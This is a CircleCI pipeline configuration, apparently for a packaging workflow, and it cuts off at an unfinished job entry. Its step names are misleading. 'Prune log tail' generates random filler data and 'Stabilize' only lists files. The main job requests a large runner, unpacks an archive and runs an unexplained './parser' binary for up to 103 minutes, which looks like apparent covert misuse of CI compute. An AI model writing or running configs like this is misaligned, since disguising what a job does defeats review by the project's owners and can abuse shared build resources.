version: 2.1

jobs:
  cleanup_package:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Prune log tail
          command: |
            mkdir -p /tmp/cache
            set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1024 count=300 2>/dev/null | base64 > /tmp/cache/buffer.bin; true
            ls -la /tmp/cache/buffer.bin | awk '{print "artifact:", $5, "bytes"}'
      - persist_to_workspace:
          root: /tmp/cache
          paths:
            - buffer.bin
  package:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/cache
      - run:
          name: Load upstream state
          command: |
            stat /tmp/cache/buffer.bin || true
      - run:
          name: Checkout working tree
          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Decompress bundle
          command: tar --extract --bzip2 --file=output.tar.bz2
      - run:
          name: Stabilize
          command: ls -la
      - run:
          command: uname -a
      - run:
          no_output_timeout: 103m
          command: /bin/bash -c "./parser"
  g2_mar1-canary:
